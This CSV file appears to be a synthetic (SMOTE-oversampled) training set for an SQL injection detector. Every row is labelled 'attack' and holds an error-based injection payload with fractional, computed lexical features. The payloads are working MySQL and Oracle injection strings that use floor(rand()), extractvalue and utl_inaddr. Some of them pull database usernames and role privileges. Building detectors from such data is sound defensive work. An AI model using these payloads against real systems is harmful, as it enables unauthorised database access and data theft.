id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001594,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,1.6811794375705293,217.957757246744,36.64596426210364,3.811793076148313,67.8745286564269,39.16645718063418,87.37515711452437,23.541614295158542,0.3104350380708279,0.17934308789237458,0.40217894116511355,0.108042932871684,0.5416142951585448,0.0,0.7291928524207276,0.0,0.7291928524207277,1.2708071475792724,0.0,15.458385704841456,0.0,0.0,3.5416142951585443,3.270807147579272,0.2708071475792723,0.0,0.0,0.7291928524207278,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.2708071475792724,0.0,0.2708071475792724,0.0,0.0,0.7291928524207276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7291928524207277,0.0,1.0,1.0,6.0
SMOTE_001595,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.6471800854239356,336.20287042063046,34.0,3.4972940114455264,81.68401858888267,52.12028704206305,145.2782777476217,57.12028704206305,0.2428545671090223,0.15503133806807992,0.4322094221418233,0.1699046726810745,0.12028704206304752,0.0,1.1202870420630477,0.0,0.0,2.1202870420630475,0.0,30.639138873810857,0.0,0.36086112618914334,0.8797129579369525,23.240574084126095,0.1202870420630478,0.0,0.12028704206304781,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.12028704206304788,1.0,0.12028704206304786,0.8797129579369523,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.1202870420630475
SMOTE_001596,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.20539319638082898,272.5744244999375,36.0,4.029535787732853,107.201677719965,35.0,96.54381583998,33.8289309399925,0.3932111196505315,0.12846854780438818,0.35420933901533996,0.12411099352974042,3.8289309399925022,0.0,0.0,0.0,2.0,1.9429769799975007,0.0,18.0,0.0,2.0,5.057023020002499,3.9429769799975007,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8859539599950015,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.885953959995001
SMOTE_001597,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,4.587065280108814,210.25276987550558,31.920580448886618,3.779526523964436,71.82493381553624,33.666094713309484,80.30145112221655,24.460290224443305,0.3411282085676907,0.15669121724059082,0.38483040177534206,0.11735017241637641,3.0794195511133826,0.0,0.0,0.0,0.0,0.9205804488866174,0.0,15.079419551113382,0.0,0.0,4.460290224443309,1.8411608977732357,1.0,0.0,0.0,0.0,0.0,0.4602902244433088,1.0,0.0,0.0,1.0,0.0,0.9205804488866174,0.0,0.4602902244433087,0.0,0.5397097755566913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5397097755566912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4602902244433087,0.4602902244433087,4.380870673329926
SMOTE_001598,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.31501894485239557,251.18645650269974,36.0,4.013946891518854,95.22441564151185,35.0,89.69966608086392,31.262374780323967,0.37896626774957753,0.13944059482316873,0.3571310383929124,0.1244620990343414,1.2623747803239689,0.0,0.0,0.0,2.0,1.0874582601079896,0.0,18.0,0.0,2.0,5.91254173989201,3.087458260107989,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.17491652021597925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.17491652021598
SMOTE_001599,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.0860085443377259,347.6378556134636,35.57476292435758,3.6909517852920364,96.23595900832426,49.9135668403909,141.70094830256969,59.787381462178786,0.276885385509721,0.14354376800468827,0.40758278530347286,0.17198806118211793,0.0,3.362144386536367,1.212618537821211,0.0,0.0,3.0,0.0,28.42523707564242,0.0,2.3621443865363676,0.2126185378212111,24.212618537821214,0.0,1.0,0.21261853782121087,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.21261853782121096,1.0,1.0,0.7873814621787891,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001600,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.7568328122672318,334.355048658054,35.63768482183785,3.6741646246186486,92.36231517816215,48.90578794540537,135.90578794540536,57.181157589081074,0.27626701730931436,0.1462168610292299,0.406476253090949,0.17103986857050674,0.18115758908107438,0.0,2.818842410918926,0.0,0.0,2.1811575890810744,0.0,28.0,0.0,3.0,0.0,25.0,0.18115758908107443,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1811575890810745,1.0,0.18115758908107438,0.8188424109189256,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.181157589081074
SMOTE_001601,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,0.9655523371527931,293.0403299232641,35.31079460948185,3.7483436808381603,95.72692657878748,35.27568215620726,121.55397304740926,40.48374814086007,0.3256140335103168,0.12143857355828022,0.4150146508496044,0.13793274208179856,0.0,4.0,0.0,0.0,1.7243178437927411,2.0,0.0,23.172953531378223,1.9999999999999996,1.7243178437927407,5.0,3.7243178437927407,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.7243178437927407,0.0,0.0,1.724317843792741,1.8621589218963703,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8621589218963703,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8621589218963703,0.0,0.1378410781036296,0.1378410781036296,9.310794609481853
SMOTE_001602,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.9041904642180536,331.7938159369376,36.0,3.677224614256267,92.0,48.0,135.0,56.79381593693765,0.2772810480635691,0.1446683729027317,0.40687979878893293,0.17117078024476623,0.0,0.0,2.58763187387529,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.58763187387529,0.0,0.0,0.7938159369376447,0.20618406306235532,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001603,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.748242637261004,348.0268117923082,35.31545880512789,3.6668276293774325,94.55048223333128,51.0804353769245,142.73816477948844,59.657729402563945,0.2717526798478999,0.14672395314748465,0.41009789648052164,0.17142547052409385,0.0,2.973188207691833,1.3422705974360558,0.0,0.0,3.0,0.0,28.68454119487211,0.0,1.9731882076918332,0.34227059743605537,24.342270597436055,0.0,1.0,0.3422705974360556,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.3422705974360556,1.0,1.0,0.6577294025639444,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001604,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.307336551768052,332.4866147814595,33.77007782781075,3.510209809330984,83.82361870197275,48.743307390729754,143.17638129802725,56.743307390729754,0.25215108671020303,0.14659986787532087,0.43058789194768776,0.1706611534667884,0.7433073907297505,0.0,0.2566926092702495,0.0,0.0,2.0,0.0,30.22992217218925,0.0,0.7700778278107486,0.7433073907297509,22.256692609270246,0.7433073907297505,0.0,0.0,0.25669260927024956,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7433073907297505,0.2566926092702495,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001605,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,1.5737135693842725,215.94450289343126,31.0,3.8757046064495837,75.0158563161625,37.0,78.94450289343126,24.9841436838375,0.3492537752061,0.17184611053122248,0.36370494208709514,0.11519517217558234,3.0079281580812482,0.9920718419187524,0.0,0.0,0.0,2.0,0.0,13.488107762878128,0.4960359209593761,0.0,5.0,2.0,0.751982039520312,0.24801796047968816,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001606,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,1.4043686174519838,227.7994441559458,32.71815655254299,3.8824924919786827,78.60433069661542,42.0406438017014,82.29539138135748,24.859078276271497,0.34484161957661713,0.18300799960819988,0.3625678749054015,0.1095825059097815,2.28184344745701,0.0,0.0,0.0,0.0,1.71815655254299,0.0,14.28184344745701,0.0,0.0,4.859078276271495,3.43631310508598,1.0,0.0,0.0,0.0,0.0,0.8590782762714951,1.0,0.0,0.0,1.0,0.0,1.71815655254299,0.0,0.859078276271495,0.0,0.1409217237285051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.14092172372850487,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.859078276271495,0.859078276271495,5.577234828814484
SMOTE_001607,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,0.06002090497517347,293.78831826121046,39.95766365224209,3.990919777950208,107.01058408693947,42.91532730448419,108.87299095672628,34.989415913060526,0.3642653764786073,0.1460624725940501,0.3705711883758576,0.11910096255148502,1.0317522608184304,0.0,1.9788318261210467,0.0,2.0,2.0,0.0,19.978831826121045,0.0,2.0,5.0,5.978831826121047,1.0,0.0,0.9894159130605231,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.9894159130605233,2.0,0.021168173878953533,0.9894159130605231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001608,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.11184974402819582,300.5030955059988,38.01622888729028,4.0215741775194775,110.85394001438745,43.1947466474834,108.40572218225708,38.04868666187085,0.36899635854129276,0.14370383572494536,0.3606785734141919,0.12662123231957,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.06491554916113,0.032457774580566534,1.9675422254194332,5.016228887290284,5.983771112709716,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.032457774580567,0.048686661870849524,0.9837711127097168,1.9837711127097166,0.032457774580566645,0.9837711127097168,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9837711127097166,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.04868666187085
SMOTE_001609,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,1.0067340155754922,274.5037804396182,36.16792681320606,4.013318560658985,106.48865868114545,35.0,98.3434145056485,34.67170725282425,0.3879876174754946,0.12750491033509925,0.35822062336167915,0.126286848827727,3.3282927471757544,0.6717072528242456,0.0,0.0,2.0,2.0,0.0,18.335853626412124,0.3358536264121229,2.0,5.0,4.0,0.8320731867939386,0.1679268132060615,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.8320731867939384,0.1679268132060613,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001610,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000030,1.7543674811250651,212.74875606558481,36.502487868830414,3.7064139019253353,57.00995147532166,39.24626819675438,90.49751213116959,25.99502426233917,0.26800288069440054,0.18446064494829678,0.4253661369911176,0.12217033736618509,0.0,0.7487560655847927,1.748756065584793,0.0,1.0,1.7487560655847927,0.0,16.0,0.0,0.0,3.748756065584793,4.497512131169585,0.0,0.7487560655847928,0.7487560655847927,0.25124393441520737,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.4975121311695854,0.0,0.7487560655847927,0.7487560655847927,0.7487560655847927,0.2512439344152073,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2512439344152073,0.0,0.2512439344152073,0.2512439344152073,6.748756065584793
SMOTE_001611,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,1.070132985774637,349.3714687276745,34.419020848217,3.5834282252162835,88.7236355134105,55.1144061830235,146.323916607132,59.2095104241085,0.25400844890171814,0.15771814282898955,0.41879286488925793,0.1694805433800344,0.0,1.6285312723255005,1.7904895758914998,0.0,0.0,3.0,0.0,29.580979151782998,0.0,0.6285312723255005,0.7904895758914998,24.7904895758915,0.0,1.0,0.7904895758914998,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7904895758914998,1.0,1.0,0.20951042410850018,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001612,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.578627386369312,219.00299849861216,40.585658390108506,4.2327578233110374,121.53885252334089,2.0,71.87848758516276,23.585658390108502,0.5541832975330669,0.009167757254866293,0.3289139950877639,0.10773495012430283,3.0,0.0,0.0,0.0,0.0,3.1464145975271256,0.0,10.0,0.0,4.439243792581378,1.0,3.1464145975271256,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.1464145975271258,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.146414597527126
SMOTE_001613,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.42074612504024816,215.34339184352677,38.34586812174415,3.7889857500405224,64.26818311306188,37.922314991317734,89.92231499131773,23.230578747829433,0.2983093465479318,0.1759341047512109,0.41781431347540665,0.10794223522545063,0.0,0.11528937391471672,1.0,0.0,1.0,1.1152893739147167,0.0,16.0,0.0,0.0,3.0,3.1152893739147167,0.0,0.11528937391471672,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.11528937391471675,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.115289373914717
SMOTE_001614,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,1.8061609220618495,235.26189399464445,42.17189209703848,4.341432239445019,133.83216375204825,2.0,74.25783814555773,25.171892097038484,0.5674209693137569,0.008566711249319986,0.3169443837821899,0.10706793565473319,3.0,0.0,0.0,0.0,0.0,3.542973024259621,0.0,10.0,0.0,5.628919072778862,1.0,3.542973024259621,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.542973024259621,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.542973024259621
SMOTE_001615,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,1.1352141251470524,218.68228155718626,31.7745825245749,3.941546425235079,78.54916504914979,40.0983300982996,76.26020388516196,23.774582524574903,0.35979715812720253,0.1829490568218363,0.3484492360831276,0.1088045489678336,3.2254174754251,0.0,0.0,0.0,0.0,2.0,0.0,12.7745825245749,0.0,0.0,5.0,2.7745825245749005,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3872912622874503,0.0,0.38729126228745014,0.0,0.6127087377125497,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.38729126228745
SMOTE_001616,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,2.184687711736104,338.4383159342718,33.45319299452265,3.544223684655222,86.89150892879451,50.812771978090616,143.2808420328641,57.45319299452265,0.25648578041182535,0.15008204367780698,0.4236456131830965,0.16978656272727116,1.0,0.0,0.9063859890453099,0.0,0.0,2.453192994522655,0.0,29.640421016432036,0.0,1.3595789835679644,0.5468070054773451,23.359578983567964,1.0,0.0,0.4531929945226548,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.4531929945226548,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.453192994522655
SMOTE_001617,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.7021726812421314,217.00192065952206,37.22371606851715,3.7659358495489808,64.5525678629657,37.0,90.67114820555145,24.7782045910049,0.2977994555238276,0.17053529115485896,0.4174999272963142,0.11416532602499928,1.3326931134926496,0.0,0.8891022955024501,0.0,0.8891022955024501,1.1108977044975499,0.0,16.44551147751225,0.0,0.0,3.2217954089950998,2.8891022955024495,1.0,0.0,0.0,0.8891022955024501,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.11089770449754988,0.8891022955024501,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8891022955024501,0.0,1.0,1.0,5.88910229550245
